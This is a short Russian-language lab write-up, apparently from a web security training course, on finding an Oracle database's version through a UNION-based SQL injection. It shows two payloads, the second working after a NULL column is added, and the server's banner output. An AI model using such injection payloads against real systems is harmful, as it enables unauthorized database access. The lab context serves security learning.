####  Lab: SQL injection attack, querying the database type and version on Oracle
 В этой работе требовалось определить версию `Oracle` при условии что мы знаем где есть инъекция в приложении, поэтому можно попробовать перебрать известные методы, я начал с того что вспомнил что такое вообще [[SQL injection UNION attacks]] потому что лаба строилась на ее применении, первое с чем я столкнулся это 500 ошибка которая говорила о том что у меня неправильный запрос, поэтому я использовал следующий запрос:
 ```
 '+UNION+SELECT+banner+FROM+v$version-- 
 ```
но `UNION` работает только если возвращается одинаковое количество столбцов, поэтому я просто добавил еще один столбец и на этот раз получилось
```
'+UNION+SELECT+banner,NULL+FROM+v$version-- 
```
Результат: 
```
>NLSRTL Version 11.2.0.2.0 - Production</th>

                        </tr>

                            <th>PL/SQL Release 11.2.0.2.0 - Production</th>
                        </tr>

                            <th>Six Pack Beer Belt</th>
```
